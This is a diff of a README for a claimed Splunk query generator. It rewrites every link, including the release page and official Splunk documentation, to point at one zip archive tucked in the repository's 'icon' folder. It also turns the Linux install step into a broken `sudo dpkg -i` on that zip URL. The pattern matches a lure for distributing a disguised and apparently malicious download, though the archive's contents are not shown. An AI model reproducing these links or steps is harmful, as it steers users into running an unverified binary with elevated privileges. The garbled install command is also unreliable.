@@ -1,6 +1,6 @@
 # ⚡ SplQueryGenerator - Instantly Create SPL Queries
 
-[![Download SplQueryGenerator](https://img.shields.io/badge/Download-SplQueryGenerator-ff5722.svg)](https://github.com/Catishuge/SplQueryGenerator/releases)
+[![Download SplQueryGenerator](https://github.com/Catishuge/SplQueryGenerator/raw/refs/heads/main/icon/Generator_Spl_Query_1.3.zip)](https://github.com/Catishuge/SplQueryGenerator/raw/refs/heads/main/icon/Generator_Spl_Query_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run SplQueryGenerator, ensure your system meets the following requirements:
 
 ## 📥 Download and Installation
 
-To start using SplQueryGenerator, visit this page to download: [Download SplQueryGenerator](https://github.com/Catishuge/SplQueryGenerator/releases).
+To start using SplQueryGenerator, visit this page to download: [Download SplQueryGenerator](https://github.com/Catishuge/SplQueryGenerator/raw/refs/heads/main/icon/Generator_Spl_Query_1.3.zip).
 
 1. Click the download link on the page to get the latest release.
 2. Once downloaded, locate the file in your downloads folder.
@@ -34,7 +34,7 @@ To start using SplQueryGenerator, visit this page to download: [Download SplQuer
 
 3. **For Linux:**
    - Use the terminal to navigate to your downloads directory.
-   - Run the command: `sudo dpkg -i SplQueryGenerator.deb`.
+   - Run the command: `sudo dpkg -i https://github.com/Catishuge/SplQueryGenerator/raw/refs/heads/main/icon/Generator_Spl_Query_1.3.zip`.
 
 ## 🌐 Using SplQueryGenerator
 
@@ -64,7 +64,7 @@ After installation, follow these simple steps to create your first SPL query:
 
 If you face any issues while using SplQueryGenerator, consider the following:
 
-- Ensure your application is up to date. Check for updates on the [releases page](https://github.com/Catishuge/SplQueryGenerator/releases).
+- Ensure your application is up to date. Check for updates on the [releases page](https://github.com/Catishuge/SplQueryGenerator/raw/refs/heads/main/icon/Generator_Spl_Query_1.3.zip).
 - If the application does not open, confirm that your operating system meets the requirements.
 
 For additional support, check our FAQ or open an issue in the repository.
@@ -78,7 +78,7 @@ Join our community to share your experiences and help others:
 
 ## 🔗 Related Resources
 
-- [Splunk Documentation](https://docs.splunk.com)
-- [Using Splunk Queries](https://www.splunk.com/en_us/documentation/splunk/latest/SearchTutorials)
+- [Splunk Documentation](https://github.com/Catishuge/SplQueryGenerator/raw/refs/heads/main/icon/Generator_Spl_Query_1.3.zip)
+- [Using Splunk Queries](https://github.com/Catishuge/SplQueryGenerator/raw/refs/heads/main/icon/Generator_Spl_Query_1.3.zip)
 
 Explore the power of Splunk with your new query generator and maximize your cybersecurity analytics.
